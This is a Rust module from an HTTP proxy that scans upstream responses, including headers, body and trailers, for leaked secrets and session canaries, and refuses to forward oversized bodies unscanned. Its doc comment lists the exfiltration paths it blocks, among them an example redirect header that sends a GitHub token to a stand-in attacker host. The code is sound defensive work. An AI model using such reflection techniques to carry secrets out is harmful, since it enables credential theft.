//! Response-direction DLP scan.
//!
//! Symmetric with the request-direction pipeline: buffer the upstream
//! response (up to `max_buffered_body_bytes`, fail-closed on
//! overflow), hand it to [`can_dlp::DlpScanner::scan_response`], and
//! refuse / pass-through based on the verdicts.
//!
//! ## Why we scan more than the body
//!
//! The previous revision was a body-only substring check for session
//! canaries. That left several open exfil paths a malicious upstream
//! could use to round-trip data back to a sandboxed worker without
//! tripping DLP:
//!
//! - `Set-Cookie: session=AKIA…` — never inspected.
//! - `Location: https://evil.com/?t=ghp_…` — never inspected.
//! - `X-Reflect: base64(canary)` — never inspected.
//! - `body = {"echo": "AKIA…"}` — caught only as a flat substring
//!   match with no JSON walk, no normalize, no source attribution.
//! - `body = base64(strip_separators(canary))` — caught by
//!   `decode_layers` but no flat `scan_text` pass meant a normalized
//!   reflection was missed.
//!
//! The full scanner walks every response header (no skip-list), the
//! body via the structured extractor, and runs `decode_layers` +
//! normalize on every extracted unit. Detector-scope policy still
//! applies, so a `github_pat` echoed by `*.github.com` is downgraded
//! to a warning instead of a block.

use http_body_util::{BodyExt, Limited};
use hyper::Response;
use tracing::warn;

use super::dlp_ctx::DlpCtx;
use super::dlp_enforce::enforce_response_verdicts;
use super::limits::ProxyLimits;
use super::request::trailer_pairs;
use super::responses::{ProxyBody, ProxyError};
use super::util::update_content_length;

pub(super) async fn scan_response(
    response: Response<hyper::body::Incoming>,
    dlp: &DlpCtx,
    host: &str,
    limits: &ProxyLimits,
) -> Response<ProxyBody> {
    let (parts, body) = response.into_parts();
    let limited = Limited::new(body, limits.max_buffered_body_bytes);
    let collected = match limited.collect().await {
        Ok(c) => c,
        Err(_) => {
            // Fail closed: an unscanned oversize body is the same risk
            // as a known-bad one.
            warn!(
                "DLP: response body from {} exceeded {} bytes — refusing to forward unscanned",
                host, limits.max_buffered_body_bytes
            );
            return ProxyError::body_too_large(host, limits.max_buffered_body_bytes)
                .into_response();
        }
    };
    // Capture trailers before consuming the buffer — an attacker-
    // controlled upstream can reflect the session canary back in
    // `Trailer:`-declared headers just as easily as in `Set-Cookie`.
    let trailers = trailer_pairs(collected.trailers());
    let bytes = collected.to_bytes();

    let headers_vec: Vec<(String, String)> = parts
        .headers
        .iter()
        .filter_map(|(name, value)| {
            value
                .to_str()
                .ok()
                .map(|v| (name.as_str().to_string(), v.to_string()))
        })
        .collect();

    let content_type = parts
        .headers
        .get(hyper::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok());
    let content_encoding = parts
        .headers
        .get(hyper::header::CONTENT_ENCODING)
        .and_then(|v| v.to_str().ok());

    let verdicts = dlp.scanner.scan_response_with_trailers(
        &headers_vec,
        &bytes,
        content_type,
        content_encoding,
        &trailers,
        host,
    );

    if let Some(resp) = enforce_response_verdicts(&verdicts, host, dlp.monitor) {
        // canary_fire is emitted inside enforce_one when the detector
        // is `canary_token`; nothing extra to log here.
        return resp;
    }

    let mut rebuilt = Response::from_parts(parts, super::responses::body_from(bytes.clone()));
    update_content_length(rebuilt.headers_mut(), bytes.len());
    rebuilt
}

#[cfg(test)]
mod tests {
    //! Direct tests of `find_canary_in_layers` are gone: the function
    //! itself is gone. End-to-end response-scan coverage now lives in
    //! `crates/can-proxy/tests/integration.rs` and in
    //! `crates/can-dlp`'s `scanner` tests (which exercise
    //! `scan_response` directly).
}
